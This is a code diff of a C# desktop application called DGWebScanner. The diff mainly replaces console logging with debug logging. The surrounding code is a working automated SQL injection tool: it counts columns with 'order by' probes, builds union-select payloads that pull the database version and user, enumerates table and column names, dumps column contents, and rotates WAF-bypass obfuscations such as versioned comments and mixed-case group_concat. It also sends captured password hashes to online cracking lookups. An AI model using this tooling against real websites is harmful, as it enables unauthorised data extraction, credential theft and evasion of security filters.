@@ -101,11 +101,11 @@ namespace DGWebScanner
                    });
                     try
                     {
-                        Console.WriteLine("sdfsd    " + websiteURL.Text);
+                       Debug.WriteLine("sdfsd    " + websiteURL.Text);
                         string originalWebsiteHtml = client.DownloadString(websiteURL.Text);
                         try
                         {
-                            Console.WriteLine(websiteURL.Text + "'");
+                           Debug.WriteLine(websiteURL.Text + "'");
                             SingleQuoteUrlBypass givenUrl = new SingleQuoteUrlBypass();
                             givenUrl.SetUrl(websiteURL.Text);
                             givenUrl.UpdateUrl();
@@ -152,7 +152,7 @@ namespace DGWebScanner
                                     n = n + 1;
                                     columnsWebsiteHtml =
                                         client.DownloadString(splitUrl[0] + "=-" + splitUrl[1] + "+order+by+" + n + "--");
-                                    Console.WriteLine(splitUrl[0] + "=-" + splitUrl[1] + "+order+by+" + n + "--");
+                                   Debug.WriteLine(splitUrl[0] + "=-" + splitUrl[1] + "+order+by+" + n + "--");
                                     if (n > 50)
                                     {
                                         break;
@@ -202,12 +202,12 @@ namespace DGWebScanner
                                                                  columnNumbers + "--";
                                 string[] unionSelectResponse = WafBypassUnionSelect(wafBypassUnionSelectUrl);
                                 string vulnerableColumnsUrl = unionSelectResponse[0];
-                                Console.WriteLine(vulnerableColumnsUrl);
+                               Debug.WriteLine(vulnerableColumnsUrl);
                                 unionSelectVersion = unionSelectResponse[1];
-                                Console.WriteLine(unionSelectVersion);
+                               Debug.WriteLine(unionSelectVersion);
                                 string unionSelectNormalBypassNo = unionSelectResponse[2];
-                                Console.WriteLine(unionSelectNormalBypassNo);
-                                Console.WriteLine(columnNumbers);
+                               Debug.WriteLine(unionSelectNormalBypassNo);
+                               Debug.WriteLine(columnNumbers);
                                 if (unionSelectNormalBypassNo == "normal" || unionSelectNormalBypassNo == "bypass")
                                 {
                                     string correctColumnNumber = " ";
@@ -247,13 +247,13 @@ namespace DGWebScanner
                                                 StringSplitOptions.None);
                                         string firstSplitVulnerableColumnsUrl = splitVulnerableColumnsUrl[0];
                                         string secondSplitVulnerableColumnsUrl = splitVulnerableColumnsUrl[1];
-                                        Console.WriteLine("SPLIT : " + firstSplitVulnerableColumnsUrl);
+                                       Debug.WriteLine("SPLIT : " + firstSplitVulnerableColumnsUrl);
                                         string[] numbersSplitVulnerableColumnsUrl =
                                             secondSplitVulnerableColumnsUrl.Split(',');
                                         numbersSplitVulnerableColumnsUrl[numbersSplitVulnerableColumnsUrl.Length - 1] =
                                             numbersSplitVulnerableColumnsUrl[numbersSplitVulnerableColumnsUrl.Length - 1
                                             ].TrimEnd('-');
-                                        Console.WriteLine(
+                                       Debug.WriteLine(
                                             numbersSplitVulnerableColumnsUrl[numbersSplitVulnerableColumnsUrl.Length - 1
                                             ]);
                                         firstSplitVulnerableColumnsUrl = firstSplitVulnerableColumnsUrl +
@@ -262,7 +262,7 @@ namespace DGWebScanner
                                         {
                                             string currentVulnerableColumnsUrl = firstSplitVulnerableColumnsUrl +
                                                                                  numbersSplitVulnerableColumnsUrl[i];
-                                            Console.WriteLine(currentVulnerableColumnsUrl + "--");
+                                           Debug.WriteLine(currentVulnerableColumnsUrl + "--");
                                             string currentVulnerableColumnsHtml =
                                                 client.DownloadString(currentVulnerableColumnsUrl + "--");
 
@@ -270,7 +270,7 @@ namespace DGWebScanner
                                                 currentVulnerableColumnsHtml.Contains(
                                                     numbersSplitVulnerableColumnsUrl[i]))
                                             {
-                                                Console.WriteLine(numbersSplitVulnerableColumnsUrl[i]);
+                                               Debug.WriteLine(numbersSplitVulnerableColumnsUrl[i]);
                                                 vulnerableColumnsStatus.Invoke((MethodInvoker)delegate
                                                {
                                                    vulnerableColumnsStatus.Text = (i + 1).ToString();
@@ -302,7 +302,7 @@ namespace DGWebScanner
                                     {
                                         firstVulnerableColumn = vulnerableColumnsStatus.Text;
                                     }
-                                    Console.WriteLine("firstVulnerableColumn : " + firstVulnerableColumn);
+                                   Debug.WriteLine("firstVulnerableColumn : " + firstVulnerableColumn);
                                     string userVersionUrl;
                                     if (newColumnNumbers != "")
                                     {
@@ -312,7 +312,7 @@ namespace DGWebScanner
                                         columnNumbers.Replace(
                                             (19970 + Convert.ToInt32(firstVulnerableColumn)).ToString(),
                                             "concat(2448,@@version,2448,user(),2448)");
-                                    Console.WriteLine("userVersionColumns : " + userVersionColumns);
+                                   Debug.WriteLine("userVersionColumns : " + userVersionColumns);
                                     if (unionSelectNormalBypassNo == "normal")
                                     {
                                         userVersionUrl = splitUrl[0] + "=-" + splitUrl[1] + "+union+select+" +
@@ -327,7 +327,7 @@ namespace DGWebScanner
                                     string[] concatResponse = WafBypassConcat(userVersionUrl);
                                     userVersionUrl = concatResponse[0];
                                     concatVersion = concatResponse[1];
-                                    Console.WriteLine(userVersionUrl);
+                                   Debug.WriteLine(userVersionUrl);
                                     string userVersionHtml = concatResponse[3];
                                     userVersionHtml = userVersionHtml.Replace("(2448,@@version,2448,user(),2448)",
                                         "DGWebScanner");
@@ -361,7 +361,7 @@ namespace DGWebScanner
                                     }
                                     else
                                     {
-                                        Console.WriteLine("Version >=5");
+                                       Debug.WriteLine("Version >=5");
                                         //find Tablenames and Columns
                                         //Database then Table and then column
                                         //Database is 4559 to 3559
@@ -389,8 +389,8 @@ namespace DGWebScanner
 
                                         foundTableAndColumnNamesUrl = foundTableAndColumnNamesUrl.Replace(
                                             "union+select", unionSelectVersion);
-                                        Console.WriteLine("foundTableAndColumnNames : ");
-                                        Console.WriteLine(foundTableAndColumnNamesUrl);
+                                       Debug.WriteLine("foundTableAndColumnNames : ");
+                                       Debug.WriteLine(foundTableAndColumnNamesUrl);
                                         string foundTableAndColumnNamesHtml;
                                         try
                                         {
@@ -399,12 +399,12 @@ namespace DGWebScanner
                                         }
                                         catch (Exception ex)
                                         {
-                                            Console.WriteLine(ex.Message);
+                                           Debug.WriteLine(ex.Message);
                                             statusInfo.Invoke((MethodInvoker)delegate
                                            {
                                                statusInfo.Text = "Website not loading. Attempting Bypass";
                                            });
-                                            Console.WriteLine("foundTableAndColumnNamesURL : " +
+                                           Debug.WriteLine("foundTableAndColumnNamesURL : " +
                                                               foundTableAndColumnNamesUrl);
                                             foundTableAndColumnNamesHtml =
                                                 client.DownloadString(foundTableAndColumnNamesUrl.Replace("where(1)",
@@ -711,7 +711,7 @@ namespace DGWebScanner
                                                "+from+" + e.Node.Parent.Text + "--+";
                 //Console.WriteLine("Before databaseInfoTreeView -> foundColumnContentURL : " + Environment.NewLine + foundColumnContentURL);
                 // foundColumnContentURL = foundColumnContentURL.Replace("+union+select+", "+" + foundColumnContentVersion + "+");
-                Console.WriteLine("databaseInfoTreeView -> foundColumnContentURL : " + Environment.NewLine +
+               Debug.WriteLine("databaseInfoTreeView -> foundColumnContentURL : " + Environment.NewLine +
                                   foundColumnContentUrl);
 
                 string[] foundColumnContentResults = WafBypassDatabaseSearch(foundColumnContentUrl);
@@ -1157,7 +1157,7 @@ namespace DGWebScanner
                  proxy.UseDefaultCredentials = false;
                  proxy.BypassProxyOnLocal = false;
                  client.Proxy = proxy;
-                 Console.WriteLine(client.DownloadString("http://bot.whatismyipaddress.com/"));
+                Debug.WriteLine(client.DownloadString("http://bot.whatismyipaddress.com/"));
              }
              */
             Settings.Default["internetTimeout"] = internetTimeoutText.Text;
@@ -1193,7 +1193,7 @@ namespace DGWebScanner
             {
                 MasterGitHubUsername = "Dgameman1",
                 CurrentVersionNumber = Settings.Default["version"].ToString()
-        };
+            };
             GitHubPage.NewVersionNumber = GitHubPage.GetRawGitHubText(updater.MasterGitHubUsername, "version.txt");
             string underscoreVersion = GitHubPage.NewVersionNumber.Replace('.', '_');
             Version newVersion = new Version(GitHubPage.NewVersionNumber);
@@ -1314,7 +1314,7 @@ namespace DGWebScanner
 
         string[] WafBypassConcat(string url)
         {
-            Console.WriteLine("wafBypassConcat URL: " + url);
+           Debug.WriteLine("wafBypassConcat URL: " + url);
             //If only 1 vulnerable column
             if (!vulnerableColumnsStatus.Text.Contains(","))
             {
@@ -1323,7 +1323,7 @@ namespace DGWebScanner
             }
             using (WebDownload client = new WebDownload())
             {
-                Console.WriteLine("NEW WAFURL : " + url);
+               Debug.WriteLine("NEW WAFURL : " + url);
                 client.Headers.Add("user-agent",
                     "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                 int n = -1;
@@ -1341,7 +1341,7 @@ namespace DGWebScanner
                             if (!vulnerableColumnsStatus.Text.Contains(","))
                             {
                                 url = url.Replace(wafConcat[n].Replace(',', '+'), wafConcat[n + 1].Replace(',', '+'));
-                                Console.WriteLine("now here : " + url);
+                               Debug.WriteLine("now here : " + url);
                             }
                             url = url.Replace(wafConcat[n], wafConcat[n + 1]);
 
@@ -1415,23 +1415,23 @@ namespace DGWebScanner
                            {
                                statusInfo.Text = "Performing WAF Bypass";
                            });
-                            Console.WriteLine("URL: " + url);
-                            Console.WriteLine("wafGroupConcat[n] : " + wafGroupConcat[n]);
-                            Console.WriteLine("wafGroupConcat[n + 1] : " + wafGroupConcat[n + 1]);
+                           Debug.WriteLine("URL: " + url);
+                           Debug.WriteLine("wafGroupConcat[n] : " + wafGroupConcat[n]);
+                           Debug.WriteLine("wafGroupConcat[n + 1] : " + wafGroupConcat[n + 1]);
                             url = url.Replace(wafGroupConcat[n], wafGroupConcat[n + 1]);
-                            Console.WriteLine(url);
+                           Debug.WriteLine(url);
                             if (url.Contains("/*!50000group_concat(2448") || url.Contains("/*!50000GRoUp_cOnCaT(2448"))
                             {
-                                Console.WriteLine(url);
+                               Debug.WriteLine(url);
                                 string replacedUrl = url.Replace(",3559)", ",3559)*/");
-                                Console.WriteLine("replacedURL : " + replacedUrl);
+                               Debug.WriteLine("replacedURL : " + replacedUrl);
                                 urlHtml = client.DownloadString(replacedUrl);
                             }
                             else
                             {
                                 urlHtml = client.DownloadString(url);
                             }
-                            Console.WriteLine(url);
+                           Debug.WriteLine(url);
                         }
                         else
                         {
@@ -1491,16 +1491,16 @@ namespace DGWebScanner
         //                    url = url.Replace(wafGroupConcat[n], wafGroupConcat[n + 1]);
         //                    if (url.Contains("/*!50000group_concat(2448") || url.Contains(",/*!50000GRoUp_cOnCaT("))
         //                    {
-        //                        Console.WriteLine(url);
+        //                       Debug.WriteLine(url);
         //                        string replacedUrl = url.Replace(",3559),", ",3559)*/,");
-        //                        Console.WriteLine(replacedUrl);
+        //                       Debug.WriteLine(replacedUrl);
         //                        urlHtml = client.DownloadString(replacedUrl);
         //                    }
         //                    else
         //                    {
         //                        urlHtml = client.DownloadString(url);
         //                    }
-        //                    Console.WriteLine(url);
+        //                   Debug.WriteLine(url);
         //                }
         //                else
         //                {
@@ -1638,49 +1638,16 @@ namespace DGWebScanner
 
         private void decodeHashButton_Click(object sender, EventArgs e)
         {
-
+            Hash hash = new Hash();
             //Fix later
-            if (decodeHashText.TextLength < 4)
+            if (!hash.ValidateHash(decodeHashText.Text))
             {
                 decodeHashStatus.Text = "Invalid Hash";
             }
             else
             {
-                decodeHashStatus.Text = "Attempting to decode Hash";
-                //Get first 4 characters of string
-                string givenHash = decodeHashText.Text;
-                char firstLetterOfHash = givenHash[0];
-                char secondLetterOfHash = givenHash[1];
-                char thirdLetterOfHash = givenHash[2];
-                char fourthLetterOfHash = givenHash[3];
-                using (WebClient client = new WebClient())
-                {
-                    client.Headers.Add("user-agent",
-                        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
-                    Console.WriteLine("http://hash-killer.com/dict/" +
-                                      firstLetterOfHash + "/" + secondLetterOfHash + "/" + thirdLetterOfHash + "/" +
-                                      fourthLetterOfHash);
-                    try
-                    {
-                        string hashkillerHtml = client.DownloadString("http://hash-killer.com/dict/" +
-                        firstLetterOfHash + "/" + secondLetterOfHash + "/" + thirdLetterOfHash + "/" + fourthLetterOfHash);
-                        Regex hashMatch = new Regex(givenHash + "\\s(.*?)\n");
-                        Match decodedHash = hashMatch.Match(hashkillerHtml);
-                        if (decodedHash.Groups[1].ToString() == string.Empty)
-                        {
-                            decodeHashStatus.Text = "No match found";
-                        }
-                        else
-                        {
-                            decodeHashStatus.Text = "Decoded: " + decodedHash.Groups[1].ToString();
-                        }
-
-                    }
-                    catch (Exception ex)
-                    {
-                        MessageBox.Show(ex.Message);
-                    }
-                }
+                decodeHashButton.Enabled = false;
+                decodeHashWorker.RunWorkerAsync();
             }
 
         }
@@ -1693,6 +1660,42 @@ namespace DGWebScanner
                 Clipboard.SetText(splitHashStatus[1]);
             }
 
+        }
+
+        private void decodeHashWorker_DoWork(object sender, DoWorkEventArgs e)
+        {
+            decodeHashStatus.Invoke((MethodInvoker)delegate
+            {
+                decodeHashStatus.Text = "Attempting to decode Hash";
+            });
+            //Get first 4 characters of string
+            string hashUrl = Hash.GetHashKillerUrl(decodeHashText.Text);
+            string decodedHash = Hash.GetHashKillerDecodedHash(hashUrl, decodeHashText.Text);
+            if (decodedHash == "0")
+            {
+                decodedHash = Hash.GetNitrxgenDecodedHash(decodeHashText.Text);
+            }
+            if (decodedHash == "0")
+            {
+                
+                decodeHashStatus.Invoke((MethodInvoker) delegate
+                {
+                    decodeHashStatus.Text = "Can't match hash";
+                });
+            }
+            else
+            {
+                decodeHashStatus.Invoke((MethodInvoker)delegate
+                {
+                    decodeHashStatus.Text = "Decoded: " + decodedHash;
+                });
+            }
+           
+        }
+
+        private void decodeHashWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
+        {
+            decodeHashButton.Enabled = true;
         }
     }
 }
